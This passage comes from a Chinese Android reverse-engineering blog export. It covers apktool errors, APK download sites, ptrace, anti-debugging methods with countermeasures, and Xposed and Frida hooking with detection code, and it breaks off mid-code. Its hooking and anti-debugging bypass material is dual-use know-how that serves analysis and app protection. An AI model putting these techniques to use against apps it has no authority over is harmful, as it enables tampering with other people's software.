class="code"><pre><span class="line">apksigner sign --ks my-release-key.jks --out my-app-release.apk my-app-unsigned-aligned.apk</span><br></pre></td></tr></table></figure></li></ol><p>apksigner位于SDK目录的build-tools目录下。必须说明的是，v2签名方式时在Android7.0后才推出的，所以只有版本&gt;25的SDK\build-tools\中才能找到apksigner.jar</p><h2 id="其他坑"><a href="#其他坑" class="headerlink" title="其他坑"></a>其他坑</h2><h3 id="1-Can’t-find-framework-resources-for-package-of-id"><a href="#1-Can’t-find-framework-resources-for-package-of-id" class="headerlink" title="1. Can’t find framework resources for package of id"></a>1. Can’t find framework resources for package of id</h3><ul><li>问题描述<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line">$ apktool d HtcContacts.apk </span><br><span class="line">I: Loading resource table...</span><br><span class="line">I: Decoding resources...</span><br><span class="line">I: Loading resource table from file: /home/brutall/apktool/framework/1.apk</span><br><span class="line">W: Could not decode attr value, using undecoded value instead: ns=android, name=drawable, value=0x02020542</span><br><span class="line">...</span><br><span class="line">W: Could not decode attr value, using undecoded value instead: ns=android, name=icon, value=0x02020520</span><br><span class="line">Can&apos;t find framework resources for package of id: 2. You must install proper framework files, see project website for more info.</span><br></pre></td></tr></table></figure></li></ul><p>一般来说，android应用需要使用一些设备上的资源文件，Apktool 需要 framework文件来编译apk。标准的frameworks框架文件已经嵌入在 apktool中, 所以大多数的apk不需要你再安装frameworks文件。</p><p>但是有一些厂商, 比如 HTC, 增加了他们自己的 framework文件. 为了使apktool 能够反编译上述 apps, 必须从设备中导出framework文件并且在apktool中安装/注册。</p><ul><li><p>解决方法</p><ol><li><p>从手机里搞出来Framework文件<br>通常位于/system/framework/目录，少数位于/data/system-framework/，甚至有些在/system/app 或 /system/priv-app目录下，通常以”resources”, “res” 或 “framework”命名。</p><p>例如HTC的资源文件为com.htc.resources.apk, LG为lge-res.apk</p></li><li>使用Framework文件进行反编译<figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line">    $ apktool if com.htc.resources.apk</span><br><span class="line">I: Framework installed to: /home/brutall/apktool/framework/2.apk</span><br><span class="line"></span><br><span class="line">    $ apktool d HtcContacts.apk </span><br><span class="line">I: Loading resource table...</span><br><span class="line">I: Decoding resources...</span><br><span class="line">I: Loading resource table from file: /home/brutall/apktool/framework/1.apk</span><br><span class="line">I: Loading resource table from file: /home/brutall/apktool/framework/2.apk</span><br><span class="line">I: Copying assets and libs...</span><br></pre></td></tr></table></figure></li></ol></li></ul><h3 id="2-9patch文件"><a href="#2-9patch文件" class="headerlink" title="2. 9patch文件"></a>2. 9patch文件</h3><p>9patch文件用于对图片进行拉伸，其左侧和上方有一条黑线，用于判断可拉伸的区域。<br>9patch有两种表现形式：</p><ul><li>直接的图片<br>存在于编译APK之前的工程中，表现为图片四周有一个黑线</li><li>二进制文件<br>android在编译成apk文件后，会把9patch信息写入到一个二进制块中叫作npTc，并且把原图片的边框去掉,直接解压缩apk看到的.9.png文件是没有黑线的</li></ul><p>所以从apk里是反编译不出来真正的9patch图片文件的，同理重打包的时候编译器去图片里找边框黑线是找不到的。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>下载GooglePlay上的apk文件</title>
      <link href="/2017/10/10/%E4%B8%8B%E8%BD%BDGooglePlay%E4%B8%8A%E7%9A%84apk%E6%96%87%E4%BB%B6/"/>
      <url>/2017/10/10/%E4%B8%8B%E8%BD%BDGooglePlay%E4%B8%8A%E7%9A%84apk%E6%96%87%E4%BB%B6/</url>
      
        <content type="html"><![CDATA[<p>GooglePlay上的apk文件需要在设备上登录google账户点击install才能安装，有时候为了方便需要直接在PC端直接下载，而网页上并没有下载选项。</p><p><img src="/images/pasted-199.png" alt="upload successful"></p><p>一些第三方的网站可以方便下载GooglePlay上的apk文件，例如：</p><ul><li>evozi    <a href="https://apps.evozi.com/apk-downloader/" target="_blank" rel="noopener">https://apps.evozi.com/apk-downloader/</a></li><li>apkcombo    <a href="https://apkcombo.com/" target="_blank" rel="noopener">https://apkcombo.com/</a></li><li>apkmirror    <a href="https://www.apkmirror.com/" target="_blank" rel="noopener">https://www.apkmirror.com/</a></li></ul><p>只需要把apk在GooglePlay上的url粘贴到这些网站上，就可以获取下载链接。</p>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>ptrace</title>
      <link href="/2017/08/01/ptrace/"/>
      <url>/2017/08/01/ptrace/</url>
      
        <content type="html"><![CDATA[<h1 id="关于ptrace"><a href="#关于ptrace" class="headerlink" title="关于ptrace"></a>关于ptrace</h1><p>ptrace可以用来监控和控制一个进程的运行，获取或更改目标进程的内存和寄存器，它主要用来进行断点调试或跟踪，</p><h1 id="参数"><a href="#参数" class="headerlink" title="参数"></a>参数</h1><p>ptrace函数体<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">#include &lt;sys/ptrace.h&gt;</span><br><span class="line"></span><br><span class="line">long ptrace(enum __ptrace_request request, pid_t pid, void *addr, void *data);</span><br></pre></td></tr></table></figure></p><ol><li>enum __ptrace_request request：指示了ptrace要执行的命令。</li><li>pid_t pid: 指示ptrace要跟踪的进程。</li><li>void *addr: 指示要监控的内存地址。</li><li>void *data: 存放读取出的或者要写入的数据。</li></ol><p>ptrace的第一个参数决定了其行为，常用到的有如下几种：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">PTRACE_ATTACHattach进程</span><br><span class="line">PTRACE_TRACEME子进程让父进程跟踪自己</span><br><span class="line">PTRACE_PEEKTEXT从内存地址中读取一个word</span><br><span class="line">PTRACE_PEEKDATA同上</span><br><span class="line">PTRACE_PEEKUSER从USER区域中读取一个word</span><br><span class="line">PTRACE_POKETEXT往内存地址中写入一个word</span><br><span class="line">PTRACE_POKEDATA同上</span><br><span class="line">PTRACE_POKEUSER往USER区写入一个word </span><br><span class="line">PTRACE_GETREGS读取寄存器</span><br><span class="line">PTRACE_GETFPREGS同上</span><br><span class="line">PTRACE_SETREGS写入寄存器</span><br><span class="line"> PTRACE_SETFPREGS同上 </span><br><span class="line">PTRACE_CONT继续执行 可同时向子进程交付指定的信号</span><br><span class="line">PTRACE_SYSCALL继续执行 进入系统调用读取参数，退出系统调用时读取返回值</span><br><span class="line">PTRACE_SINGLESTEP继续执行 单步调试</span><br><span class="line">PTRACE_DETACHdeattach</span><br></pre></td></tr></table></figure></p><h1 id="ptrace检测"><a href="#ptrace检测" class="headerlink" title="ptrace检测"></a>ptrace检测</h1><p>进程被ptrace后通常会有一些特征，这些特征也常常作为反调试的判断依据：</p><h2 id="status"><a href="#status" class="headerlink" title="status"></a>status</h2><p>/proc/pid/status 和 /proc/pid/task/pid/status：普通状态下，TracerPid这项应该为0；调试状态下为调试进程的PID。<br><img src="/images/pasted-79.png" alt="upload successful"></p><h2 id="stat"><a href="#stat" class="headerlink" title="stat"></a>stat</h2><p>/proc/pid/stat 和 /proc/pid/task/pid/stat：调试状态下，括号后面的第一个字母应该为t</p><p><img src="/images/pasted-80.png" alt="upload successful"></p><h2 id="wchan"><a href="#wchan" class="headerlink" title="wchan"></a>wchan</h2><p>/proc/pid/wchan 和 /proc/pid/task/pid/wchan：调试状态下，里面内容为ptrace_stop<br><img src="/images/pasted-81.png" alt="upload successful"></p><h1 id="实例"><a href="#实例" class="headerlink" title="实例"></a>实例</h1><p>假设目标进程如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">//target.c</span><br><span class="line">#include &lt;stdio.h&gt;</span><br><span class="line">                                                          </span><br><span class="line">int main(int argc,char* argv[])</span><br><span class="line">&#123;</span><br><span class="line">        while(1)</span><br><span class="line">        &#123;</span><br><span class="line">                printf(&quot;Target is running:%d\n&quot;, count);</span><br><span class="line">                count++;</span><br><span class="line">                sleep(3);</span><br><span class="line">        &#125;</span><br><span class="line">        return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>利用ptrace操作目标进程：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br></pre></td><td class="code"><pre><span class="line">int main(int argc, char *argv[])</span><br><span class="line">&#123;   </span><br><span class="line">    if(argc != 2) </span><br><span class="line">    &#123;</span><br><span class="line">       printf(&quot;please input pid...\n&quot;);</span><br><span class="line">       return 1;</span><br><span class="line">    &#125;</span><br><span class="line">          </span><br><span class="line">    pid_t traced_process;</span><br><span class="line">    int status;</span><br><span class="line">    traced_process = atoi(argv[1]);</span><br><span class="line"> </span><br><span class="line">    if( ptrace(PTRACE_ATTACH, traced_process, NULL, NULL) != 0)</span><br><span class="line">    &#123;</span><br><span class="line">        printf(&quot;Trace process failed:%d.\n&quot;, errno);</span><br><span class="line">    return 1;</span><br><span class="line">    &#125;</span><br><span class="line">    while(1)</span><br><span class="line">    &#123;</span><br><span class="line">        wait(&amp;status);</span><br><span class="line">        if(WIFEXITED(status))</span><br><span class="line">        &#123;</span><br><span class="line">            break;</span><br><span class="line">        &#125;</span><br><span class="line">        tracePro(traced_process);</span><br><span class="line">    ptrace(PTRACE_SYSCALL, traced_process, NULL, NULL);</span><br><span class="line">    &#125;</span><br><span class="line">      </span><br><span class="line">    ptrace(PTRACE_DETACH, traced_process, NULL, NULL);</span><br><span class="line">          </span><br><span class="line">    return 0;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>参考资料：</p><ol><li>ptrace <a href="http://man7.org/linux/man-pages/man2/ptrace.2.html" target="_blank" rel="noopener">http://man7.org/linux/man-pages/man2/ptrace.2.html</a></li></ol>]]></content>
      
      
      
    </entry>
    
    <entry>
      <title>Android反调试和对抗</title>
      <link href="/2017/06/13/Android%E5%8F%8D%E8%B0%83%E8%AF%95/"/>
      <url>/2017/06/13/Android%E5%8F%8D%E8%B0%83%E8%AF%95/</url>
      
        <content type="html"><![CDATA[<h1 id="反调试"><a href="#反调试" class="headerlink" title="反调试"></a>反调试</h1><h2 id="1-自己ptrace自己"><a href="#1-自己ptrace自己" class="headerlink" title="1.自己ptrace自己"></a>1.自己ptrace自己</h2><p>代码非常简单，在so中加上这行代码即可：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">ptrace(PTRACE_TRACEME, 0, 0, 0);</span><br></pre></td></tr></table></figure></p><p>其中PTRACE_TRACEME代表：本进程被其父进程所跟踪。<br>一个进程只能被ptrace一次，通常在调试的时候都会attach被调试应用的进程，如果我们先占坑，父进程attach自己，那么其他的附加调试就会失败。</p><h2 id="2-检测Tracerpid的值"><a href="#2-检测Tracerpid的值" class="headerlink" title="2.检测Tracerpid的值"></a>2.检测Tracerpid的值</h2><p>在自己的应用中的native层加上一个循环检查自己status中的TracerPid字段值，如果非0或者是非自己进程pid(如果采用了第一种方案的话，这里也是需要做一次过滤的)；那么就认为被附加调试了。</p><h2 id="3-调试器端口检测"><a href="#3-调试器端口检测" class="headerlink" title="3.调试器端口检测"></a>3.调试器端口检测</h2><p>以IDA为例，读取/proc/net/tcp，查找IDA远程调试的默认23946端口（或者执行命令netstat -apn），如果处于监听状态说明被存在调试可能。</p><h2 id="4-调试器名称检测"><a href="#4-调试器名称检测" class="headerlink" title="4.调试器名称检测"></a>4.调试器名称检测</h2><p>遍历进程，查找类似android_server，gdbserver，gdb等调试器进程</p><h2 id="5-多进程反调试"><a href="#5-多进程反调试" class="headerlink" title="5.多进程反调试"></a>5.多进程反调试</h2><p>目标程序创建了多个进程，互相ptrace，不同进程分工明确，守护或者反调试。只要有一个进程出现异常，集体挂掉以对抗。</p><p><strong>对抗</strong><br>多进程都是通过fork出来的，因此我们修改/bionic/libc/bionic/fork.c里面的fork函数来使得目标进程fork失败</p><h2 id="6-检测系统关键文件"><a href="#6-检测系统关键文件" class="headerlink" title="6.检测系统关键文件"></a>6.检测系统关键文件</h2><p>进程被ptrace后通常会有一些特征，这些特征也常常作为反调试的判断依据：</p><h3 id="status"><a href="#status" class="headerlink" title="status"></a>status</h3><p>/proc/pid/status 和 /proc/pid/task/pid/status：普通状态下，TracerPid这项应该为0；调试状态下为调试进程的PID。<br><img src="/images/pasted-79.png" alt="upload successful"></p><h3 id="stat"><a href="#stat" class="headerlink" title="stat"></a>stat</h3><p>/proc/pid/stat 和 /proc/pid/task/pid/stat：调试状态下，括号后面的第一个字母应该为t</p><p><img src="/images/pasted-80.png" alt="upload successful"></p><h3 id="wchan"><a href="#wchan" class="headerlink" title="wchan"></a>wchan</h3><p>/proc/pid/wchan 和 /proc/pid/task/pid/wchan：调试状态下，里面内容为ptrace_stop<br><img src="/images/pasted-81.png" alt="upload successful"></p><h2 id="7-代码执行时间检测"><a href="#7-代码执行时间检测" class="headerlink" title="7.代码执行时间检测"></a>7.代码执行时间检测</h2><p>调试状态和非调试状态代码执行时间不一样，如果两个时间值相差过大，则说明中间的代码流程被调试了。因为调试者停下来一步步观察了这一段代码的执行情况，因此这部分代码的执行时间远远超出了普通状态的执行时间。</p><h2 id="8-使用inotify对文件系统进行监视"><a href="#8-使用inotify对文件系统进行监视" class="headerlink" title="8.使用inotify对文件系统进行监视"></a>8.使用inotify对文件系统进行监视</h2><p>/proc/pid/maps<br>/proc/pid/mem<br>/proc/pid/pagemep</p><h1 id="防dump"><a href="#防dump" class="headerlink" title="防dump"></a>防dump</h1><p>通过对目标进程文件/proc/pid/mem文件操作，可以获得其内存的数据。<br>而inotify可以监控文件系统的变化，当文件被打开、删除，读写等操作时，同时用户相应变化。<br>因此可以通过监控/proc/pid/mem 与/proc/pid/pagemep来防止内存dump。</p><p>参考资料：</p><ol><li>Android反调试技术整理与实践（<a href="https://gtoad.github.io/2017/06/25/Android-Anti-Debug/）" target="_blank" rel="noopener">https://gtoad.github.io/2017/06/25/Android-Anti-Debug/）</a></li></ol>]]></content>
      
      
      
        <tags>
            
            <tag> Android </tag>
            
        </tags>
      
    </entry>
    
    <entry>
      <title>Android三大hook框架</title>
      <link href="/2017/06/13/Android%E4%B8%89%E5%A4%A7hook%E6%A1%86%E6%9E%B6/"/>
      <url>/2017/06/13/Android%E4%B8%89%E5%A4%A7hook%E6%A1%86%E6%9E%B6/</url>
      
        <content type="html"><![CDATA[<p>目前Android主流的hook框架有Xposed、Substrate和frida三种，下面依次介绍三种框架的原理和特点：</p><h2 id="Xposed"><a href="#Xposed" class="headerlink" title="Xposed"></a>Xposed</h2><p>Xposed是一个在andoid平台上比较成熟的hook框架，可以完美的在dalvik虚拟机上做到hook任意java方法</p><h3 id="原理"><a href="#原理" class="headerlink" title="原理"></a>原理</h3><p>Android系统中所有的app进程都是有zygote进程孵化而来的，Xposed会替换/system/bin/app_process文件，替换后的app_process在启动过程中会加载XposedBridge.jar这个jar包，从而完成对Zygote进程及其创建的Dalvik虚拟机的劫持</p><h3 id="运行条件"><a href="#运行条件" class="headerlink" title="运行条件"></a>运行条件</h3><ol><li>由于需要替换app_process，故需要root或在recovery下刷机</li><li>重启手机后插件才会生效</li></ol><h3 id="使用方法"><a href="#使用方法" class="headerlink" title="使用方法"></a>使用方法</h3><ul><li>1.AndroidManifest.xml中添加Xposed</li></ul><p>需在Application Node中添加三个Meta(xposedmodule,xposedminversion和xposeddescription)<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><span class="line">&lt;manifest xmlns:android=&quot;http://schemas.android.com/apk/res/android&quot;  </span><br><span class="line">    package=&quot;com.example.xposedtest&quot;  </span><br><span class="line">    android:versionCode=&quot;1&quot;  </span><br><span class="line">    android:versionName=&quot;1.0&quot; &gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;uses-sdk  </span><br><span class="line">        android:minSdkVersion=&quot;14&quot;  </span><br><span class="line">        android:targetSdkVersion=&quot;19&quot; /&gt;  </span><br><span class="line">  </span><br><span class="line">    &lt;application  </span><br><span class="line">        android:allowBackup=&quot;true&quot;  </span><br><span class="line">        android:icon=&quot;@drawable/ic_launcher&quot;  </span><br><span class="line">        android:label=&quot;@string/app_name&quot;  </span><br><span class="line">        android:theme=&quot;@style/AppTheme&quot; &gt;  </span><br><span class="line">        &lt;span style=&quot;color:#ff0000;&quot;&gt;  </span><br><span class="line">        &lt;!-- 以下三个为需要添加的meta--&gt; </span><br><span class="line"> &lt;meta-data android:value=&quot;true&quot; android:name=&quot;xposedmodule&quot;/&gt;</span><br><span class="line"> &lt;meta-data android:value=&quot;30&quot; android:name=&quot;xposedminversion&quot;/&gt;</span><br><span class="line"> &lt;meta-data android:value=&quot;this is a test&quot; android:name=&quot;xposeddescription&quot;/&gt;&lt;/span&gt;  </span><br><span class="line">    &lt;/application&gt;  </span><br><span class="line">  </span><br><span class="line">&lt;/manifest&gt;</span><br></pre></td></tr></table></figure></p><ol><li><p>assets目录下新建一个xposed_init文件</p></li><li><p>重写XC_MethodHook的两个方法beforeHookedMethod和afterHookedMethod</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br></pre></td><td class="code"><pre><span class="line">package com.example.xposedtest;</span><br><span class="line">import static de.robv.android.xposed.XposedHelpers.findAndHookMethod;</span><br><span class="line">import android.graphics.Color;</span><br><span class="line">import android.util.Log;</span><br><span class="line">import de.robv.android.xposed.XposedBridge;</span><br><span class="line">import android.widget.TextView;</span><br><span class="line">import de.robv.android.xposed.IXposedHookLoadPackage;</span><br><span class="line">import de.robv.android.xposed.XC_MethodHook;</span><br><span class="line">import de.robv.android.xposed.callbacks.XC_LoadPackage.LoadPackageParam;</span><br><span class="line">public class XposedTest implements IXposedHookLoadPackage&#123;  //实现IXposedHookLoadPackage接口</span><br><span class="line"></span><br><span class="line">        public void handleLoadPackage(final LoadPackageParam lpparam) throws Throwable&#123;</span><br><span class="line">        //判断Hook的包是否正确</span><br><span class="line">        if(!lpparam.packageName.equals(&quot;com.android.systemui&quot;))</span><br><span class="line">        &#123;</span><br><span class="line">        XposedBridge.log(&quot;not found package&quot;);</span><br><span class="line">        return;</span><br><span class="line">        &#125;</span><br><span class="line">        //找到要Hook的类名和函数，创建自己的类</span><br><span class="line">        findAndHookMethod(&quot;com.android.systemui.statusbar.policy.Clock&quot;,lpparam.classLoader,&quot;updateClock&quot;,new XC_MethodHook()&#123;</span><br><span class="line">        </span><br><span class="line">        @Override</span><br><span class="line">                protected void beforeHookedMethod(MethodHookParam param) throws Throwable &#123;</span><br><span class="line">                    // 这里的调用在正常函数调用之前执行，由于本例是Hook时间显示，需要在显示之后调用，所以省略</span><br><span class="line">                &#125;</span><br><span class="line">        </span><br><span class="line">        @Override</span><br><span class="line">        protected void afterHookedMethod(MethodHookParam param) throws Throwable&#123;</span><br><span class="line">        // 这里的调用在正常函数调用之后执行</span><br><span class="line">        XposedBridge.log(&quot;aaaaaaaaaaaaaa&quot;+lpparam.packageName);</span><br><span class="line">        TextView tv=(TextView)param.thisObject;</span><br><span class="line">        String text=tv.getText().toString();</span><br><span class="line">        tv.setText(text+&quot;:)&quot;);</span><br><span class="line">        tv.setTextColor(Color.RED);</span><br><span class="line">        &#125;</span><br><span class="line">        &#125;);</span><br><span class="line">       </span><br><span class="line">        &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li></ol><h3 id="hook检测"><a href="#hook检测" class="headerlink" title="hook检测"></a>hook检测</h3><h4 id="1-通过PackageManager查看安装列表，判断是否有安装Xposed-Installer相关的软件包"><a href="#1-通过PackageManager查看安装列表，判断是否有安装Xposed-Installer相关的软件包" class="headerlink" title="1.通过PackageManager查看安装列表，判断是否有安装Xposed Installer相关的软件包"></a>1.通过PackageManager查看安装列表，判断是否有安装Xposed Installer相关的软件包</h4><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">PackageManager packageManager = context.getPackageManager();</span><br><span class="line">List applicationInfoList = packageManager.getInstalledApplications(PackageManager.GET_META_DATA);</span><br><span class="line">for (ApplicationInfo applicationInfo: applicationInfoList) &#123;</span><br><span class="line">    if (applicationInfo.packageName.equals(&quot;de.robv.android.xposed.installer&quot;)) &#123;</span><br><span class="line">        // Xposed find</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br></pre></td></tr></table></figure><p>通常情况下使用Xposed Installer框架都会屏蔽对其的检测，即Hook掉PackageManager的getInstalledApplications方法的返回值，以便过滤掉de.robv.android.xposed.installer来躲避这种检测。</p><h4 id="2-根据调用栈判断"><a href="#2-根据调用栈判断" class="headerlink" title="2.根据调用栈判断"></a>2.根据调用栈判断</h4><p>Xposed Installer框架对每个由Zygote孵化的App进程都会介入，因此在程序方法异常栈中就会出现Xposed相关的“身影”，我们可以通过制造异常Exception来读取异常堆栈，检查其中是否存在Xposed的调用方法。<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">try &#123;</span><br><span class="line">    throw new Exception(&quot;blah&quot;);</span><br><span class="line">&#125; catch(Exception e) &#123;</span><br><span class="line">    for (StackTraceElement stackTraceElement: e.getStackTrace()) &#123;</span><br><span class="line">        // stackTraceElement.getClassName() stackTraceElement.getMethodName() 是否存 在Xposed</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><p>以下为使用xposed的调用栈：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">E/GEnvironment: no such table: preference (code 1): while compiling: SELECT keyguard_show_livewallpaper FROM preference</span><br><span class="line">...</span><br><span class="line">at com.meituan.test.extpackage.ExtPackageManager.checkUpdate(ExtPackageManager.java:127)</span><br><span class="line">at com.meituan.test.MiFGService$1.run(MiFGService.java:41)</span><br><span class="line">at android.os.Looper.loop(Looper.java:136)</span><br><span class="line">at android.app.ActivityThread.main(ActivityThread.java:5072)</span><br><span class="line">at java.lang.reflect.Method.invokeNative(Native Method)</span><br><span class="line">at java.lang.reflect.Method.invoke(Method.java:515)</span><br><span class="line">...</span><br><span class="line">at com.android.internal.os.ZygoteInit$MethodAndArgsCaller.run(ZygoteInit.java:793)</span><br><span class="line">at com.android.internal.os.ZygoteInit.main(ZygoteInit.java:609)</span><br><span class="line">at de.robv.android.xposed.XposedBridge.main(XposedBridge.java:132) //发现Xposed模块</span><br><span class="line">at dalvik.system.NativeStart.main(Native Method)</span><br></pre></td></tr></table></figure></p><h4 id="3-读取-proc-self-maps判断"><a href="#3-读取-proc-self-maps判断" class="headerlink" title="3.读取/proc/self/maps判断"></a>3.读取/proc/self/maps判断</h4><p>无论在Java层做何种检测，Xposed都可以通过Hook相关的API并返回指定的结果来绕过检测，只要有方法就可以被Hook。如果仅在Java层检测就显得很徒劳，为了有效提搞检测准确率，就须做到Java和Native层同时检测。</p><p>在Native层读取/proc/self/maps文件，判断App自身加载的库中是否存在XposedBridge.jar、相关的Dex、Jar和So库等文件<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br></pre></td><td class="code"><pre><span class="line">bool is_xposed()</span><br><span class="line">&#123;</span><br><span class="line">   bool rel = false;</span><br><span class="line">   FILE *fp = NULL;</span><br><span class="line">   char* filepath = &quot;/proc/self/maps&quot;;</span><br><span class="line">   ...</span><br><span class="line">   string xp_name = &quot;XposedBridge.jar&quot;;</span><br><span class="line">   fp = fopen(filepath,&quot;r&quot;)) </span><br><span class="line">   while (!feof(fp))                                 </span><br><span class="line">   &#123;</span><br><span class="line">       fgets(strLine,BUFFER_SIZE,fp);                    </span><br><span class="line">       origin_str = strLine;</span><br><span class="line">       str = trim(origin_str);</span><br><span class="line">       if (contain(str,xp_name))</span><br><span class="line">       &#123;</span><br><span class="line">           rel = true; //检测到Xposed模块</span><br><span class="line">           break;</span><br><span class="line">       &#125;</span><br><span class="line">   &#125;</span><br><span class="line">    ...</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></p><h2 id="Frida"><a href="#Frida" class="headerlink" title="Frida"></a>Frida</h2><p>frida是一个跨平台的hook框架，可以hook Java和native层，且不需要每次都重启手机。官网：<a href="http://www.frida.re/" target="_blank" rel="noopener">http://www.frida.re/</a></p><h3 id="hook对抗"><a href="#hook对抗" class="headerlink" title="hook对抗"></a>hook对抗</h3><ol><li><p>遍历进程，判断frida-server是否运行</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line">public boolean checkRunningProcesses() &#123;</span><br><span class="line">  boolean returnValue = false;</span><br><span class="line">  // Get currently running application processes</span><br><span class="line">  List&lt;RunningServiceInfo&gt; list = manager.getRunningServices(300);</span><br><span class="line">  if(list != null)&#123;</span><br><span class="line">    String tempName;</span><br><span class="line">    for(int i=0;i&lt;list.size();++i)&#123;</span><br><span class="line">      tempName = list.get(i).process;</span><br><span class="line">      if(tempName.contains(&quot;fridaserver&quot;)) &#123;</span><br><span class="line">        returnValue = true;</span><br><span class="line">      &#125;</span><br><span class="line">    &#125;</span><br><span class="line">  &#125;</span><br><span class="line">  return returnValue;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure></li><li><p>fridaserver 默认的 TCP 端口是 27047，可以检查这个端口是否开放</p><figure class="highlight plain"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span 